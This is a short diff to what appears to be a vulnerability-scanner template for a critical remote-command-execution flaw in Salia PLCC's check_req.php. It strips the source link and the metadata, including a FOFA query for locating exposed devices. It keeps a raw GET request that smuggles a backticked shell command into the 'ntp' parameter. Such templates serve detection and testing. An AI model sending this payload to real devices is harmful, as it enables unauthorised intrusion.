@@ -3,12 +3,8 @@ info:
   name: Salia PLCC check_req.php 命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sqmlkwxi5tm842yy'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sqmlkwxi5tm842yy
-    fofa: body="Salia PLCC"
 http:
 - raw:
   - 'GET /check_req.php?ntp=`id>test123.txt` HTTP/1.1
